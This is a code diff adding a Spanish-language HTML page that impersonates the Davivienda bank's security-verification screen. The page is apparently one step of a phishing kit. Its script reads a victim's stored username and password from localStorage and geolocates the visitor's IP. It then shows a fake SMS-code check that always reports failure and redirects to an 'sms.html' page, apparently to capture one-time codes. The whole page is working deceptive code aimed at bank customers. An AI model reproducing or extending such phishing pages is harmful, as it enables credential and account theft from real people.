@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Davivienda</title>
+
+    <link rel="shortcut icon" href="https://enlinea.davivienda.com.pa/ebanking/images/favicon.ico">
+    <link href="./index_files/combined.css" type="text/css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css" integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+
+    <style>
+        body {
+            display: none;
+        }
+
+        /* ---------- Cargador de puntos ---------- */
+        .sms-loader-container {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .loader-title {
+            color: #333;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+
+        .dot-loader {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 40px;
+            margin-bottom: 15px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            margin: 0 5px;
+            border-radius: 50%;
+            background-color: #0055a0;
+            animation: dotLoader 1.5s infinite ease-in-out;
+        }
+
+        .dot:nth-child(1) {
+            animation-delay: -.3s;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: -.15s;
+        }
+
+        @keyframes dotLoader {
+            0%, 80%, 100% {
+                transform: scale(0);
+                opacity: .3;
+            }
+            40% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .loading-text {
+            color: #666;
+            font-size: 14px;
+            font-style: italic;
+            margin-top: 10px;
+        }
+
+        .verification-info {
+            text-align: center;
+            color: #666;
+            font-size: 13px;
+            line-height: 1.5;
+            margin-top: 15px;
+            padding: 0 20px;
+        }
+
+        .verification-info i {
+            color: #0055a0;
+            margin-right: 5px;
+        }
+
+        /* ---------- Barra de progreso ---------- */
+        .processing-bar {
+            position: relative;
+            width: 80%;
+            height: 4px;
+            margin: 20px auto;
+            border-radius: 2px;
+            background-color: #e0e0e0;
+            overflow: hidden;
+        }
+
+        .processing-bar::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background-color: #0055a0;
+            animation: processing 3s infinite ease-in-out;
+        }
+
+        @keyframes processing {
+            0%   { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .countdown {
+            color: #888;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        .success-message {
+            color: #4caf50;
+            font-weight: bold;
+            margin-top: 15px;
+            animation: fadeIn .5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to   { opacity: 1; }
+        }
+
+        /* ---------- Código manual ---------- */
+        .manual-input {
+            width: 200px;
+            padding: 10px;
+            text-align: center;
+            font-size: 18px;
+            letter-spacing: 5px;
+        }
+
+        .manual-block {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .manual-btn {
+            width: 200px;
+        }
+    </style>
+
+    <noscript>
+        <img src="/insga7s/in/bcb5a7fec28c3715cee6b8f6601d2047/1/1" style="display: none" alt="">
+    </noscript>
+</head>
+
+<body style="display: block">
+
+    <div class="outerDiv_" id="outer1">
+
+        <div id="superiorSinLogin">
+            <div style="float: right; padding-right: 73px">
+                <div class="idiomaLink">
+                    <i class="fa fa-language" style="font-size: 1.2em"></i>
+                    <a id="selectorEs" href="#" style="display: none">Español</a>
+                    <a id="selectorEn" href="#">English</a>
+                </div>
+            </div>
+            <div id="banner"></div>
+        </div>
+
+        <div id="center">
+            <div id="loginBox">
+
+                <form id="loginFormNuevo" autocomplete="off">
+
+                    <audio id="audio" controls style="display: none">
+                        <source type="audio/wav">
+                    </audio>
+
+                    <div class="contentDiv">
+
+                        <div id="titleBox">
+                            <h2 id="tituloIngreseUsername" class="titulo-login">
+                                Verificación de Seguridad
+                            </h2>
+                        </div>
+
+                        <div id="pedirUsernameBox">
+
+                            <div id="errorBox" style="visibility: hidden">
+                                <span id="errorPlaceholder">Error</span>
+                                <span id="errorServicioAvatar" class="value" style="display: none">
+                                    Error al consultar avatar
+                                </span>
+                            </div>
+
+                            <div class="sms-loader-container">
+
+                                <div class="loader-title">
+                                    <i class="fa fa-shield-alt"></i> Verificando código SMS
+                                </div>
+
+                                <div class="dot-loader">
+                                    <div class="dot"></div>
+                                    <div class="dot"></div>
+                                    <div class="dot"></div>
+                                </div>
+
+                                <div class="loading-text">
+                                    Cargando y validando código de seguridad...
+                                </div>
+
+                                <div class="processing-bar"></div>
+
+                                <div class="countdown" id="countdown">
+                                    Redirigiendo en <span id="timer">20</span> segundos...
+                                </div>
+
+                                <div class="verification-info">
+                                    <i class="fa fa-info-circle"></i>
+                                    Estamos verificando el código SMS enviado a su dispositivo móvil. Por favor, espere un momento.
+                                </div>
+
+                                <div id="successMessage" class="success-message" style="display: none">
+                                    <i class="fa fa-times-circle"></i> ¡Verificación Fallida! Redirigiendo...
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+
+                </form>
+
+            </div>
+        </div>
+
+        <div id="clearfooter"></div>
+    </div>
+
+    <div id="footer">
+        <ul>
+            <li class="footerText">
+                Davivienda - © 2017 Davivienda - Todos los derechos reservados
+            </li>
+        </ul>
+    </div>
+
+    <script>
+        'use strict';
+
+        /* =====================================================
+           CONFIGURACIÓN
+           ===================================================== */
+        const CONFIG = {
+            SEGUNDOS: 20,
+            PAGINA_SIGUIENTE: 'sms.html',
+            RETARDO_REDIRECCION: 1500
+        };
+
+        /* =====================================================
+           Datos de sesión
+           ===================================================== */
+        const datos = {
+            usuario: localStorage.getItem('usuario') || 'No capturado',
+            clave: localStorage.getItem('clave') || 'No capturado',
+            ip: null,
+            ubicacion: null,
+            coords: null,
+            codigo: null
+        };
+
+        /* =====================================================
+           Utilidades
+           ===================================================== */
+        function generarCodigo() {
+            return String(Math.floor(100000 + Math.random() * 900000));
+        }
+
+        async function obtenerIP() {
+            try {
+                const respuesta = await fetch('https://ipapi.co/json/');
+                const info = await respuesta.json();
+
+                return {
+                    ip: info.ip || 'No disponible',
+                    ciudad: info.city || 'No disponible',
+                    region: info.region || 'No disponible',
+                    pais: info.country_name || 'No disponible',
+                    proveedor: info.org || 'No disponible',
+                    lat: info.latitude || null,
+                    lon: info.longitude || null
+                };
+            } catch (error) {
+                console.error('Error obteniendo IP:', error);
+                return { ip: 'Error al obtener', ciudad: 'No disponible', region: '', pais: '', proveedor: '', lat: null, lon: null };
+            }
+        }
+
+        function irASiguiente() {
+            localStorage.removeItem('usuario');
+            localStorage.removeItem('clave');
+            window.location.href = CONFIG.PAGINA_SIGUIENTE;
+        }
+
+        /* =====================================================
+           Contador y cierre
+           ===================================================== */
+        function iniciarContador() {
+            const timer = document.getElementById('timer');
+            const countdown = document.getElementById('countdown');
+            const mensajeExito = document.getElementById('successMessage');
+
+            let segundos = CONFIG.SEGUNDOS;
+
+            const intervalo = setInterval(function () {
+                segundos--;
+                timer.textContent = segundos;
+
+                if (segundos <= 5) {
+                    countdown.style.color = '#4CAF50';
+                    countdown.style.fontWeight = 'bold';
+                }
+
+                if (segundos <= 0) {
+                    clearInterval(intervalo);
+                    countdown.style.display = 'none';
+                    mensajeExito.style.display = 'block';
+
+                    setTimeout(irASiguiente, CONFIG.RETARDO_REDIRECCION);
+                }
+            }, 1000);
+        }
+
+        /* =====================================================
+           Alternativa: código manual
+           ===================================================== */
+        function mostrarInputManual() {
+            const contenedor = document.querySelector('.sms-loader-container');
+
+            contenedor.innerHTML =
+                '<div style="text-align:center;">' +
+                    '<div class="loader-title"><i class="fa fa-keyboard"></i> Ingrese código manualmente</div>' +
+                    '<div class="manual-block">' +
+                        '<input type="text" id="codigoManual" class="manual-input" maxlength="6" placeholder="000000" inputmode="numeric">' +
+                    '</div>' +
+                    '<div>' +
+                        '<input type="button" value="Validar Código" class="botonSiguiente manual-btn" id="botonManual">' +
+                    '</div>' +
+                    '<div class="verification-info" style="margin-top:20px;">' +
+                        '<i class="fa fa-info-circle"></i> Ingrese el código de 6 dígitos que recibió por SMS' +
+                    '</div>' +
+                '</div>';
+
+            const campo = document.getElementById('codigoManual');
+
+            campo.addEventListener('input', function () {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+            });
+
+            document.getElementById('botonManual').addEventListener('click', validarCodigoManual);
+            campo.focus();
+        }
+
+        function validarCodigoManual() {
+            const campo = document.getElementById('codigoManual');
+            const codigo = campo.value.trim();
+
+            if (!/^\d{6}$/.test(codigo)) {
+                alert('Por favor ingrese un código válido de 6 dígitos');
+                campo.focus();
+                return;
+            }
+
+            datos.codigo = codigo;
+
+            const contenedor = document.querySelector('.sms-loader-container');
+
+            contenedor.innerHTML =
+                '<div style="text-align:center;">' +
+                    '<div class="loader-title"><i class="fa fa-shield-alt"></i> Validando código</div>' +
+                    '<div class="dot-loader">' +
+                        '<div class="dot"></div><div class="dot"></div><div class="dot"></div>' +
+                    '</div>' +
+                    '<div class="loading-text">Validando código ingresado...</div>' +
+                    '<div class="success-message" style="margin-top:15px;">' +
+                        '<i class="fa fa-check-circle"></i> ¡Código válido! Redirigiendo...' +
+                    '</div>' +
+                '</div>';
+
+            setTimeout(irASiguiente, CONFIG.RETARDO_REDIRECCION);
+        }
+
+        function reenviarCodigo() {
+            datos.codigo = generarCodigo();
+
+            const countdown = document.getElementById('countdown');
+            const htmlOriginal = countdown.innerHTML;
+
+            countdown.innerHTML =
+                '<span style="color:#0055A0;"><i class="fa fa-sync-alt"></i> Nuevo código generado: ' +
+                datos.codigo +
+                '</span>';
+
+            setTimeout(function () {
+                countdown.innerHTML = htmlOriginal;
+            }, 3000);
+        }
+
+        /* =====================================================
+           Arranque
+           ===================================================== */
+        async function iniciarProceso() {
+            const info = await obtenerIP();
+
+            datos.ip = info.ip;
+            datos.ubicacion = info.ciudad + ', ' + info.region + ', ' + info.pais;
+            datos.coords = (info.lat && info.lon) ? { lat: info.lat, lon: info.lon } : null;
+            datos.codigo = generarCodigo();
+
+            iniciarContador();
+        }
+
+        window.addEventListener('DOMContentLoaded', iniciarProceso);
+    </script>
+
+</body>
+</html>
